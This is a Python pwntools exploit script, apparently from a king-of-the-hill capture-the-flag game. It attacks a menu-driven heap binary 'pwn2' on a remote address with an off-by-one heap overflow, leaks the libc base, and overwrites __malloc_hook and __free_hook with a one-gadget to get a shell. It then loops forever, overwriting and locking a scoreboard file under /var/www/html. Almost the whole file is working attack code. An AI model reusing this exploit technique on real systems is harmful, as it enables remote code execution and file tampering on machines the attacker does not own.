#coding:utf-8
import sys
import base64
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./pwn2')
			#io=process(['./pwn'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./pwn2')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
		else :
			io=remote('172.16.0.195',8888)
			elf=ELF('pwn2')
			libc=ELF('./libc-2.29.so')
		
		def add(a,b,c):
			io.sendlineafter('> ','1')
			io.sendlineafter('idx:',str(b))
			io.sendlineafter('size:',str(a))
			io.sendafter('cnt:',c)


		def delete(a):
			io.sendlineafter('> ','2')
			io.sendlineafter('idx:',str(a))

		def edit(a,b):
			io.sendlineafter('> ','3')
			io.sendlineafter('idx:',str(a))
			io.sendafter('cnt:',b)

		def show(a):
			io.sendlineafter('> ','4')
			io.sendlineafter('idx:',str(a))

		def pwn(a):
			io.sendlineafter('> ','5')
			io.sendafter('are 666!\n',a)

		add(0x88,0,'a'*0x88)
		add(0x568,1,'\x00'*0x568)
		add(0x88,2,'\x00'*0x88)
		add(0x588,3,'\x00'*0x1a0+p64(0)+p64(0x100)+'\n')
		add(0x88,4,'/bin/sh\x00'+'\x00'*0x80)
		edit(0,'\x00'*0x88+'\x01\x06')
		delete(1)
		add(0x568,1,'\x00'*0x568)
		show(2)
		libc_base=u64(io.recv(8))-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		delete(1)
		add(0x5f0,1,'\x00'*0x568+p64(0x241)+p64(libc.sym['__malloc_hook'])+'\n')
		delete(1)
		delete(2)
		add(0x5f0,1,'\x00'*0x568+p64(0x241)+p64(libc.sym['__malloc_hook'])+'\n')
		pwn(p64(libc.sym['__free_hook']))
		pwn(p64(libc_base+0x106ef8))
		io.sendlineafter('> ','1')
		io.sendlineafter('idx:','7')
		io.sendlineafter('size:','199')
		#delete(4)
		


		
		
		



		success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.sendline('cd /var/www/html/Hill')
		while True :
			io.sendline('chmod 777 /var/www/html/Hill/SCORE_POINTS*')
			io.sendline('echo "<team>自动送分皮皮虾</team>" > SCORE_POINTS')
			io.sendline('chmod 444 SCORE_POINTS')
			io.sendline('cat /var/www/html/Hill/SCORE_POINTS')
			print io.recv()
		# print io.recv()
		# sleep(0.1)
		io.interactive()
		io.close()
		#sleep(0.1)




	except Exception as e:
		continue
	else:
		continue